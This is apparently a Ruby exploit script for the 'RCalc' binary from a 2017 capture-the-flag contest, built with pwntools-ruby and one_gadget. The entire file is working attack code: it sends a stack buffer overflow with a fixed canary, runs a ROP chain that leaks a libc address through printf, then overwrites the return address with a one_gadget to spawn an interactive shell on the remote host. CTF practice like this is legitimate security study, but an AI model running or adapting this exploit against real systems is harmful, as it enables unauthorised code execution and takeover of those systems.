#!/usr/bin/env ruby
# encoding: ascii-8bit
require_relative '../zocket/zocket'
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

@magic = one_gadget(file: '/lib/x86_64-linux-gnu/libc.so.6')[0]

host, port = 'rcalc.2017.teamrois.cn', 2333
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Zocket.new host, port #, logger: HexLogger.new
def z;$z;end
@p = 'RCalc'
def h;@h ||= heapinfo(@p); @h.reload!;end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64'
canary = 0x2
pop_rdi = 0x401123
work = 0x400fa2
main = 0x401036
nop = 0x00000000004007fe
rop = flat(
  nop, # need rsp % 16 == 0 in printf
  pop_rdi,
  0x601ff0,
  elf.plt.printf.to_i,
  main
)
z.puts 'A' * 264 + canary.p64 + 'A' * 8 + rop
z.gets 'smart'
def pt;z.gets 'choice:', do_log: false;end

35.times do
  pt
  z.puts 1; z.puts 1; z.puts 1
  z.gets 'Save'
  z.puts 'yes'
end
pt
z.puts 5
libc = ELF.new('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = u64(z.read(6) + "\x00\x00") - 0x20740
p "libc @ #{libc.address.hex}"
h.offset(libc.address)

z.puts "\x00" * 264 + canary.p64 + 'A' * 8 + p64(libc.address+@magic)
z.gets 'smart'
35.times do
  pt
  z.puts 1; z.puts 1; z.puts 1
  z.gets 'Save'
  z.puts 'yes'
end
pt
z.puts 5

z.interact
